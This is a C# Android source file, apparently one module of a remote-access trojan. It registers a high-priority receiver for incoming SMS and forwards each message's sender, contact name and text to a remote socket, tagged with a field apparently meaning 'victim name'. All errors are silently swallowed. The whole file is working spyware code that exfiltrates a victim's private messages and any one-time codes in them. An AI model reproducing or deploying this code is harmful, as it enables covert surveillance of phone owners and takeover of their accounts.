using Android.App;
using Android.Content;
using Android.OS;
using Android.Telephony;
using System;

namespace Task2
{
    [BroadcastReceiver(Enabled = true, Label = "SMS Receiver", Exported = true)]
    [IntentFilter(new[] { "android.provider.Telephony.SMS_RECEIVED" }, Priority = (int)IntentFilterPriority.HighPriority)]
    class SMSBroadcastReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            Bundle bundle = intent.Extras;
            try
            {
                if (bundle != null)
                {

                    Java.Lang.Object[] pdusObj = (Java.Lang.Object[])bundle.Get("pdus");


                    SmsMessage currentMessage = SmsMessage.CreateFromPdu((byte[])pdusObj[0]);
                    string phoneNumber = currentMessage.DisplayOriginatingAddress;
                    string senderNum = phoneNumber;
                    string message = currentMessage.DisplayMessageBody;
                    string isim = ((MainActivity)MainActivity.global_activity).telefondanIsim(senderNum);

                    ((MainActivity)MainActivity.global_activity).
                    soketimizeGonder("RECSMS", "[VERI]" + isim + "[VERI]" + senderNum + "[VERI]" + message +
                   "[VERI]" + MainValues.KRBN_ISMI + "@" + MainActivity.Soketimiz.RemoteEndPoint.ToString() + "[VERI][0x09]");
                }


            }
            catch (Exception)
            {
            }
        }
    }
}